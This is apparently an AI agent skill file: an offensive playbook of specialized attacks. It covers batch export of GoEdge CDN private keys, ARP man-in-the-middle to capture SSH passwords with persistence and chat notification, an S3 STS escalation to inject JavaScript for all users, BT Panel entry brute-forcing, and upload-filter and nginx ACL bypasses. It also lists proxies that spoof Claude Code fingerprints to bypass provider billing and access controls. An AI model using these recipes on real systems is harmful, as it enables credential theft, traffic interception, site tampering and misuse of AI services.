---
name: specialized-attack-playbooks
description: >-
  Specialized exploitation: GoEdge private-key export, illicit CDN forensics, ARP MITM, CDN→S3 STS chains, BT Panel+UniApp, AI IDE API reverse proxy, OCS+MinIO; includes references/scripts supporting file indexing. Use when applying specialized playbooks for GoEdge, CDN, ARP MITM, BT Panel, OCS, MinIO.
metadata:
  tags: [penetration-testing, red-team]
---

## Specialized Exploitation (Fully Inline)

### GoEdge CDN(Port 8002) Batch Private-Key Export
```
Fingerprint: curl -s http://T:8002/ → {"message":"Welcome to API"} | POST /SSLCertService/findEnabledSSLCertConfig → requires X-Cloud-Access-Token
Vulnerability: findEnabledSSLCertConfig checks identity but not scope → any administrator key can export all system TLS private keys(keyData=plaintext PEM base64)
Two-step authentication: POST /APIAccessTokenService/getAPIAccessToken {"accessKeyId":AK,"accessKey":SK,"type":"admin"} → data.token
          Subsequent requests include Header X-Cloud-Access-Token: <token>
Batch extraction(Python): for id in range(1,500): POST /SSLCertService/findEnabledSSLCertConfig {"sslCertId":id} headers={token}
  → base64-decode r.json()['data']['sslCertJSON'] → json → dnsNames + keyData(base64 PEM private key) | skip b64=="bnVsbA=="(null)
Assets: Fofa app="GoEdge"&&port="8002" / Shodan http.title:"GoEdge" port:8002 / "Welcome to API" port:8002
Use: private key→MITM/traffic decryption/forged certificates | reuse AK/SK credentials against other GoEdge instances | gain administrative access to CDN edge nodes
```

### Illicit CDN Post-Exploitation Forensics(Determine what it operates after compromising the CDN)
```
Five steps: ①enumerate all certificates(ID 1-500; expired/disabled certificates may also contain private keys and reveal historical operations) ②initial keyword classification ③verify real access(critical! do not trust certificate domains alone;
      let requests follow redirects and inspect the final landing page title/meta/h1/JS redirects) ④reclassify by actual content ⑤mark high-value targets
Keyword matrix(dnsNames classification): wallet phishing tokenpocket/tokenpoket(letter-substitution typosquatting)/metamask/trust | payment fraud paypal/wxpay/bayspay/147pay
  adult paid site groups xiuren/xrw/sood/laikantu/tuhaokan/kantu | pirated video 7she/acgzy/yiyiyi/dilige/80sjdy/mogudong
  VPN circumvention futo-on/xyou/gogocloud/douyinjiasu/tudoujiasu | broad-site SEO 0x000/tc7/vn00/fc000/ikkk(programmatic wildcard-DNS redirect chain) | lottery fraud 0149/dh49/999pian(pian=fraud)
High-value labels: A: valid wallet/payment private keys→MITM/HTTPS phishing green lock | B: ACME auto-renewing certificates for sustained monitoring | C: AK/SK credential reuse+WHOIS association with the operator's other assets
Indicators(🔴critical): normal+adult+pirated sites co-hosted on the same server | many wildcard certificates for broad site groups | brand and impersonation domains on the same CDN(internal phishing operation) | a single administrator key exports all private keys(GoEdge has no isolation by default)
```

### ARP MITM on the Same L2 to Steal SSH Passwords(Target on the Same Segment, Password Unknown)
```
Applicable: target on the same L2(same Hyper-V host/same VLAN)+a controlled pivot host available+target SSH password unknown
🚨Key trap: arpspoof reports "couldn't arp for host"(libnet MAC resolution often times out on Hyper-V/CentOS7)
  Fix: ip neigh replace TARGET_IP lladdr TARGET_MAC dev eth0 nud permanent(prefill the gateway too) → skip libnet resolution; arpspoof then works
Deploy: echo 1>/proc/sys/net/ipv4/ip_forward | arpspoof×4 bidirectionally(one process each for target↔gateway) | tcpdump -w x.pcap -s0 -C100 -W10 host TARGET
  dsniff -i eth0 -w /tmp/dsniff.log(capture plaintext SSH/FTP/HTTP passwords only)
Persistence: crontab '*/2 * * * * /root/mitm_chk.sh' as a backup + rc.local startup
Verify: pgrep -c arpspoof==4 | tcpdump -r x.pcap to check whether target traffic was captured
Notification: hermes cron create 'every 2 minutes' --no-agent --deliver feishu:chat_id(only notify when useful: script detects new dsniff log content→prints to stdout→delivers; stay silent with no new content)
Cleanup: pkill arpspoof/tcpdump/dsniff | echo 0>ip_forward | remove the MITM crontab line | ip neigh del each entry | rm pcap/log
```

### Multi-Layer Domain-Rotation CDN Anti-Blocking System → S3 STS Credential Escalation Chain
```
Architecture identification: entry domain → JS redirect layer 1(random subdomain+wildcard DNS) → redirect layer 2 → real business site(static landing page)
  CDN indicators: Server: Xcdn | "Please access via the domain name" | 987dns.com domestic DNS routing(overseas returns 0.0.0.0)
  Key breakthrough points:
    ①the real business site's inline HTML JS exposes the mainDomains list(layer by layer)+base64-encoded subsite redirect configuration
    ②the deepest landing page references resources from sites outside the CDN(ug458.com/idcpc8.com, etc.)→ bypass the CDN and target the origin directly
    ③the origin is S3(AmazonS3 header/ListBucket public) → expose the bucket name
    ④the same site provides APK downloads → reverse-engineer the API domain+AES key+STS acquisition path
    ⑤register→login→JWT→/BBS/GetSTSToken → AWS STS temporary credentials(PutObject permission)
    ⑥S3 write = CDN origin tampering = JavaScript injection for all users(equivalent to RCE)
  
  Technical details:
    AES-CBC encrypted API communication: key exposed twice, in frontend JS(lazyDecryptImg.js) and APK(.so strings)
    ASP.NET backend: identify from validation-error format+traceId | prefer form-urlencoded(JSON may return 415)
    Registration without verification: no SMS/no CAPTCHA/arbitrary phone numbers → bulk registration may be possible
    Over-privileged STS: ordinary user role receives s3:PutObject → overwrite CDN origin files
    Public S3 bucket ListBucket: prefix parameter ineffective(CDN cache), but direct S3-domain access allows full enumeration
  Reference: references/cdn-antiblock-s3-attack-chain.md
```

### BT Panel Penetration Testing + UniApp/DCloud APK Reverse Engineering
```
=== BT Panel Fingerprinting ===
Fingerprint: ports 19362/8888/random high port + cookie name containing a 32-character MD5 hash + "_ssl" suffix(e.g. 721301c19a31e887cb1f5a5726fbaae5_ssl)
  Set-Cookie appearing in a 404 response = confirmed BT Panel; port 888 usually hosts phpMyAdmin(403=IP allowlist)
Security entry: newer BT Panel requires a random 8-character path(/xxxxxxxx/); without guessing it the panel cannot be reached. All API endpoints are behind the security-entry path.
  Brute-force strategy: domain-related variants(bt+domain prefix) + common operations habits(admin888/bt123456/btpanel) + random 8-character values(success rate extremely low)
  Bypass: no known general bypass(2024+); old CVE-2023-38038(unauthorized phpMyAdmin) only <=7.7
  Lateral approach: multiple sites sharing BT Panel on one IP → break into a weak site → pivot to the target site; BT Panel's default www user controls all sites

=== UniApp/DCloud APK Reverse Engineering(highly efficient) ===
Identify: assets/dcloud_uniplugins.json + assets/apps/<appid>/ + uni-jsframework.js
Core: all business logic is in JS/Vue files under assets/apps/<appid>/www/(no need to decompile Java with jadx)
  API extraction: grep -r 'https\?://' assets/apps/ | filter baseURL/apiUrl/request configuration
  Authentication: search token/key/secret/Authorization → hardcoded credentials are common in config.js/env.js/manifest.json
  Encryption: search aes/encrypt/decrypt/sign → frontend encryption=plaintext(the key must be in JS)
  WebSocket: search wss://ws:// → real-time communication backend address
Priority: manifest.json(appid/version/permissions) → config- or env-related JS(API addresses) → page JS(business logic/IDOR)

=== ChengZi(ChengZi/d3504.cn) SDK Decryption ===
Scenario: adult/illicit APP distribution landing pages commonly use ChengZi for no-input invitations+redirects+APK distribution
init3 endpoint: POST /web/<appkey>/<channel>/init3 → returns URL-safe base64-encoded XOR-encrypted data
Decrypt: base64url_decode → XOR each byte with 0x96 → JSON(containing fu=download URL, ph=package path, fm=redirect method)
  Script: scripts/chengzi_decrypt.py
Use: decrypt to obtain the real APK's Alibaba Cloud FC function URL → download the APK → reverse-engineer the backend API
```

### AI IDE API Reverse Proxy/Key-Leak Directory(Discover and assess reverse-proxy options for AI coding tools)
```
Background: as of 2026-04, Cursor Web's free API retains only gemini-3-flash and has removed Claude entirely → Claude 4.6+ requires another channel
Available options: freemodel-cc-proxy(free, real Claude through FreeModel, disguises Claude Code fingerprint to bypass 403, Opus4.8/Sonnet4.6) | WindsurfAPI(dwgx, Windsurf gRPC-to-API, 100+ models, account-pool rotation)
  askalf/dario(Claude Pro/Max subscription to API, bypasses headless billing) | bypass/chatgpt-adapter(xllm-go, aggregates multiple reverse-engineered interfaces into OpenAI format)
Deprecated: cursor2api/cursor2api-go(only gemini-3-flash remains) | Auxiliary: claude-tap(MITM intercepts real AI Agent traffic to study system prompts/tool calls)
GitHub search method: api.github.com/search/repositories?q=cursor+api+reverse+proxy&sort=stars → filter desc → /repos/<o>/<r>/readme(base64-decode and read) → /search/issues for current status
Keywords: cursor api reverse proxy / cursor workos token / claude proxy cursor / AI IDE api reverse engineering
```

### OCS Online Customer-Service System Penetration + MinIO Object-Storage Exploitation
```
Entry discovery: customer-service links in landing-page HTML expose the OCS domain(e.g. leiyushan.com) → load the SPA with Playwright and intercept real API calls
Authentication flow: POST /api/v1/v/init {cid,vid} → data.tk = visitor token; subsequent requests use header x-v-token: <token>
Core APIs: /api/v1/v/bc(start chat) /api/v1/v/oss/sign(get upload signature) /api/v1/v/message/send(send message)
Upload chain: GET /api/v1/v/oss/sign → {sn,et,ul,ulw,dir,cid,og} → POST https://UL/api/v1/f/wj/tr
  Headers: sign=<sn>, expTime=<et>  form: file=@file, cid=<cid>, dir=<dir>, og=<og>, fn=<filename>, fg=0
Blacklist bypass(extensions outside the allowlist are blocked):
  ✓ .jsp.jpg(double extension, final ext passes the check) ✓ .jsp%00.jpg(null-byte truncation) ✓ .jsp;.jpg(Tomcat path parameter)
  ✗ .jsp/.jspx/.JSP/.Jsp/war/php/py/sh/xml/svg/html/txt/json/yaml/properties/sql/doc/ini/conf
⚠️ Files are stored in MinIO object storage=static objects and are not executed by Tomcat(write into the webroot to achieve RCE)
  Verify: curl https://UL/bucket/dir/date/filename → returns file content(plain text, not execution)
dir parameter traversal: the sign service does not validate dir content(always returns a fixed bucket sign); the upload service checks bucket permissions
  dir=conf → 500(attempt to write the conf bucket but insufficient permission) dir=../../ → 500(traversal rejected)
MinIO Console(port 9001): POST /api/v1/login {"accessKey":"X","secretKey":"Y"} → 403=invalid Login
  CVE-2023-28432: POST /minio/health/cluster?verify → patched in newer versions(returns BadRequest without disclosing env)
CDN-layer identification(response-size fingerprints):
  CDN WAF block page ~2000 bytes | WSCN JS challenge page ~6000 bytes(Embed Iframe) | nginx 404 = 146 bytes
  Spring Boot JSON 404 ~100 bytes | Tomcat HTML 404 ~435 bytes
nginx method restriction: admin paths(/api/v1/a/ /api/v1/s/) allow only GET → POST returns 405
WSCN CDN JS challenge: automatically pass with Playwright | path allowlist is independent of the JS challenge(passing the challenge can still leave path ACL blocking)
Spring Boot path traversal: /c/..;/path → bypass nginx path ACL to reach Spring Boot(semicolon=Tomcat path-parameter truncation)
BT Panel entry: Set-Cookie discloses the cookie name → the random 8-character entry path cannot be derived and must be brute-forced
Longteng CDN: TLS certificate exposes all associated domains | Server header exposes origin OS version
```

## Supporting File Index

```
=== references/ Attack-Chain Records ===
cdn-antiblock-s3-attack-chain.md        Multi-layer domain-rotation CDN anti-blocking→S3 STS credential escalation chain
faka-system-attack-chain.md             Card-distribution system(XHFAKA/Xinghai) enumeration/second-order XSS/lock bypass/WAF blind spots
ocs-im-system-attack-chain.md           Complete OCS online customer-service IM attack chain
ocs-minio-upload-attack-chain.md        OCS upload→MinIO object-storage exploitation chain
chinese-app-distribution-pentest.md     Domestic illicit APP-distribution landing-page penetration(ChengZi/FC/CDN)
phpcms-v9-attack-surface.md             PHPCMS V9 attack surface

=== references/ CDN/Spring/WebSocket Bypass ===
spring-boot-cdn-bypass.md               Spring Boot Actuator path traversal+interceptor bypass
cdn-waf-bypass-spring-boot.md           CDN WAF bypass(502/JS challenge)+Spring backend
cdn-bypass-gccdn-ocs.md                 GCCDN/WSCN response-filter bypass
cdn-websocket-bypass-spring-auth.md     WebSocket upgrade through CDN to reach Spring
stomp-websocket-cdn-bypass.md           STOMP over SockJS CDN bypass
sockjs-stomp-exploitation.md            SockJS/STOMP privilege escalation+SpEL injection
spring-stomp-sockjs-exploitation.md     Spring STOMP authentication+unauthorized subscription

=== references/ nginx/PHP Fingerprinting ===
nginx-pathinfo-bypass-and-fingerprint.md   PATH_INFO deny bypass+response-size fingerprinting
nginx-php-fingerprint-bypass.md            nginx/PHP-FPM differential fingerprinting
nginx-404-differential-fingerprinting.md   catch-all vs true 404 differential enumeration

=== references/ APK Reverse Engineering ===
uniapp-apk-reverse-engineering.md       Complete UniApp/DCloud reverse engineering(JS/.so/.dat)
uniapp-apk-reversing.md                 UniApp reverse-engineering quick reference(RC4 deobfuscation+domain discovery)
uniapp-dcloud-apk-reversing.md          DCloud structure+HTTPDNS identification
bt-panel-attack-methodology.md          BT Panel fingerprinting+entry brute force+lateral movement

=== scripts/ ===
js_rc4_deobfuscate.js       JS RC4+rotating string-array deobfuscation(extract→node decode)
chengzi_decrypt.py          ChengZi init3 XOR decryption(fu download URL)
decrypt_aes_cbc_api.py      AES-CBC encrypted API communication decryption template(hardcoded key/iv)
s3_sts_exploit.py           AWS S3 STS temporary-credential exploitation(verification/listing/writing/permission enumeration)
stomp_sockjs_exploit.py     STOMP over SockJS exploitation template(CDN bypass+authentication+injection)
spring_stomp_exploit.py     Spring STOMP unauthorized subscription/sending
```

